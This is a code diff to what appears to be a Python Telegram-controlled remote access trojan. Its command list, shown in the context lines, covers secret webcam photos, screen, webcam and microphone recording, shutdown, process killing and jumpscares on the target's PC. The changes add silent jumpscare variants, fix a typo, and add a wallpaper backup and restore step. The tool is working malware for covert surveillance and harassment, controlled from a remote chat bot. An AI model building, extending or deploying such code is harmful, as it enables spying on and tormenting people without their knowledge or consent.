@@ -147,9 +147,11 @@ selphie - Take a webcam selfie.
 shutdown - Shut down the PC.  
 duckyhelp - Show Duckyscript tutorial.  
 jumpscare - Show random jumpscare.  
+jumpscarenoaudio - Jumpscare no audio.
 screenshot - Capture screen.  
 fullclip - Record screen + webcam.  
 plankton - Plankton.
+planktonnoaudio - Plankton no audio.
 gabinetti - Gabinetti nella villa.
 webcamclip - Record webcam.  
 screenclip - Record screen.  
@@ -683,7 +685,9 @@ class PeppinoTelegram:
             "microphone":self.send_record_audio,
             "help":lambda: self.bsend(self.help),
             "invertedscreen":self.inverted_screen,
+            "planktonnoaudio":self.planktonnoaudio,
             "distortedscreen":self.distorted_screen,
+            "jumpscarenoaudio":self.jumpscarenoaudio,
             "fullclip":self.record_webcam_and_screen,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
             "terminateprocess":self.terminate_process_by_name,
@@ -1230,6 +1234,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
             imageThread.join()
         self.audio_mixer.setVolumePercentage(old_volume)
 
+    def jumpscarenoaudio(self) -> None:
+        self.jumpscare(playaudio=False)
 
     def record_jumpscare_reaction(self, onlycamera=False) -> None:
         if onlycamera:
@@ -1246,8 +1252,11 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         status_message.delete()
 
     
-    def plankton(self) -> None:
-        self.jumpscare("plankton", "plankton")
+    def plankton(self, audio=True) -> None:
+        self.jumpscare("plankton", "plankton", playaudio=audio)
+    
+    def planktonnoaudio(self) -> None:
+        self.plankton(audio=False)
     
     def gabinetti(self) -> None:
         self.jumpscare("plankton", "gabinetti")
@@ -1325,7 +1334,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
             except TypeError as e:
                 self.bsend(f"Invalid args for function {command}\n{e}")
             except Exception as e:
-                self.bsend(f"Unhandler error for function {command}\n{e}")
+                self.bsend(f"Unhandled error for function {command}\n{e}")
         elif not func:
             if command == "PK_next_page" and self.process_explorer_menu:
                 self.page += 1
@@ -1345,6 +1354,8 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         map(remove, listdir(BURN_DIRECTORY))
         destroyAllWindows()
         self.audio_mixer.mute()
+        self.restore_wallpaper()
+        self.cantopenlist.clear()
     
     def parse_document(self, msg: str) -> None:
         document = msg["document"]
@@ -1424,6 +1435,9 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         response = requests.post(url, json=payload)
         return response.status_code == 200
 
+    def restore_wallpaper(self) -> None:
+        change_wallpaper(self.backup_wallpaper_path)
+
     def start(self) -> None:
         try:
             self.bot.deleteWebhook()
@@ -1432,6 +1446,8 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.update_commands()
         self.images = load_images()
         self.audios = load_audios()
+        self.backup_wallpaper_path = join(BURN_DIRECTORY, "wppbkp.png")
+        backup_wallpaper(self.backup_wallpaper_path) 
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
         if not sys.argv[1:]:
